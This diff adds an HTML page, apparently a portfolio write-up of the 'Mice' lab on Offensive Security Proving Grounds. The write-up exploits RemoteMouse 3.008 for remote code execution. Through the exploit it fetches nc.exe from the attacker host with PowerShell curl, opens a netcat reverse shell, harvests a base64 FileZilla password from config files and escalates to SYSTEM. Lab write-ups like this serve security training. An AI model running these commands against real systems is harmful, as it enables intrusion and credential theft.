@@ -1,0 +1,136 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab demonstrates exploiting RemoteMouse 3.008 to achieve remote code execution via a modified exploit that delivers a reverse shell. Learners will escalate privileges by extracting and decoding credentials from FileZilla&#39;s configuration files, gaining RDP access as a user. Finally, they will exploit the RemoteMouse application&#39;s admin privileges to spawn a Command Prompt as Administrator. This lab emphasizes RCE, credential exploitation, and leveraging application misconfigurations for privilege escalation."><title>Proving Grounds: Mice</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Windows</span><h1>Proving Grounds: Mice</h1><p>This lab demonstrates exploiting RemoteMouse 3.008 to achieve remote code execution via a modified exploit that delivers a reverse shell. Learners will escalate privileges by extracting and decoding credentials from FileZilla&#39;s configuration files, gaining RDP access as a user. Finally, they will exploit the RemoteMouse application&#39;s admin privileges to spawn a Command Prompt as Administrator. This lab emphasizes RCE, credential exploitation, and leveraging application misconfigurations for privilege escalation.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objective">Learning Objective</a></li><li><a href="#after-completion-of-this-lab-learners-will-be-able-to">After completion of this lab, learners will be able to:</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>In this lab, the RemoteMouse 3.008 exploit will be used on port 1978 for remote code execution, capturing a reverse shell with Netcat. After decoding the FileZilla password, we will log in via Remote Desktop and open a Command Prompt as an administrator. This lab focuses on exploiting service vulnerabilities and privilege escalation methods.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab demonstrates exploiting RemoteMouse 3.008 to achieve remote code execution via a modified exploit that delivers a reverse shell. Learners will escalate privileges by extracting and decoding credentials from FileZilla&#39;s configuration files, gaining RDP access as a user. Finally, they will exploit the RemoteMouse application&#39;s admin privileges to spawn a Command Prompt as Administrator. This lab emphasizes RCE, credential exploitation, and leveraging application misconfigurations for privilege escalation.</p>
+<h2 id="learning-objective">Learning Objective</h2>
+<h2 id="after-completion-of-this-lab-learners-will-be-able-to">After completion of this lab, learners will be able to:</h2>
+<ul>
+<li>Perform a full port scan to identify services and vulnerabilities on the target.</li>
+<li>Exploit RemoteMouse 3.008 to achieve remote code execution and a reverse shell.</li>
+<li>Enumerate FileZilla configuration files to extract encoded user credentials.</li>
+<li>Decode the extracted credentials and log in via RDP.</li>
+<li>Use RemoteMouse&#39;s privileged settings to spawn a Command Prompt with Administrator access.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/mice]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sCV -p- 192.168.155.199
+Nmap scan report for 192.168.155.199
+Host is up (0.022s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT     STATE SERVICE        VERSION
+1978/tcp open  remotemouse    Emote Remote Mouse
+1979/tcp open  unisql-java?
+1980/tcp open  pearldoc-xact?
+3389/tcp open  ms-wbt-server  Microsoft Terminal Services
+|_ssl-date: 2026-05-27T00:03:44+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Remote-PC
+| Not valid before: 2026-05-25T23:56:56
+|_Not valid after:  2026-11-24T23:56:56
+| rdp-ntlm-info: 
+|   Target_Name: REMOTE-PC
+|   NetBIOS_Domain_Name: REMOTE-PC
+|   NetBIOS_Computer_Name: REMOTE-PC
+|   DNS_Domain_Name: Remote-PC
+|   DNS_Computer_Name: Remote-PC
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-05-27T00:03:16+00:00
+7680/tcp open  pando-pub?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>findstr /SIM /C:&quot;pass&quot; *.ini *.cfg *.xml
+
+# Execute the next evidence-gathering step in the authorized lab.
+
+C:\Users\divine&gt;findstr /SIM /c:&quot;pass&quot; *.ini *.cfg *.xml
+findstr /SIM /c:&quot;pass&quot; *.ini *.cfg *.xml
+AppData\Roaming\FileZilla\filezilla.xml
+AppData\Roaming\FileZilla\recentservers.xml</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Read the file contents for useful configuration or credential data.
+
+C:\Users\divine&gt;type AppData\Roaming\FileZilla\recentservers.xml
+# Read the file contents for useful configuration or credential data.
+
+type AppData\Roaming\FileZilla\recentservers.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;FileZilla3 version=&quot;3.54.1&quot; platform=&quot;windows&quot;&gt;
+        &lt;RecentServers&gt;
+                &lt;Server&gt;
+                        &lt;Host&gt;ftp.pg&lt;/Host&gt;
+                        &lt;Port&gt;21&lt;/Port&gt;
+                        &lt;Protocol&gt;0&lt;/Protocol&gt;
+                        &lt;Type&gt;0&lt;/Type&gt;
+                        &lt;User&gt;divine&lt;/User&gt;
+                        &lt;Pass encoding=&quot;base64&quot;&gt;Q29udHJvbEZyZWFrMTE=&lt;/Pass&gt;
+                        &lt;Logontype&gt;1&lt;/Logontype&gt;
+                        &lt;PasvMode&gt;MODE_DEFAULT&lt;/PasvMode&gt;
+                        &lt;EncodingType&gt;Auto&lt;/EncodingType&gt;
+                        &lt;BypassProxy&gt;0&lt;/BypassProxy&gt;
+                &lt;/Server&gt;
+        &lt;/RecentServers&gt;
+&lt;/FileZilla3&gt;</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+Base64 Decoded: ControlFreak11</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/mice]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ xfreerdp /u:divine /p:&#39;ControlFreak11&#39; /v:192.168.155.199</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/mice]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ git clone https://github.com/p0dalirius/RemoteMouse-3.008-Exploit.git
+Cloning into &#39;RemoteMouse-3.008-Exploit&#39;...
+remote: Enumerating objects: 64, done.
+remote: Counting objects: 100% (64/64), done.
+remote: Compressing objects: 100% (60/60), done.
+remote: Total 64 (delta 32), reused 14 (delta 4), pack-reused 0 (from 0)
+Receiving objects: 100% (64/64), 2.02 MiB | 2.58 MiB/s, done.
+Resolving deltas: 100% (32/32), done.</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/mice/RemoteMouse-3.008-Exploit]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.155.199 --cmd &quot;powershell -c \&quot;curl http://192.168.45.191/nc.exe -o C:/Users/Public/nc.exe\&quot;&quot;</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/mice/RemoteMouse-3.008-Exploit]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.155.199 --cmd &quot;powershell -c \&quot;C:/Users/Public/nc.exe 192.168.45.191 80 -e cmd\&quot;&quot;</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/mice]
+# Run the helper or analysis script used in this lab step.
+
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.155.199 - - [26/May/2026 20:53:23] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                           
+┌──(.venv)─(kali㉿kali)-[~/offsec/mice]
+# Create the network connection required for this lab step.
+
+└─$ nc -nlvp 80                                                                           
+listening on [any] 80 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.155.199] 50914
+Microsoft Windows [Version 10.0.19042.1348]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\divine&gt;</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The output records the result observed during this authorized lab step.
+
+https://www.exploit-db.com/exploits/50047</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The output records the result observed during this authorized lab step.
+
+In the GUI, follow https://www.exploit-db.com/exploits/50047
+Got the nt_authority/system</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
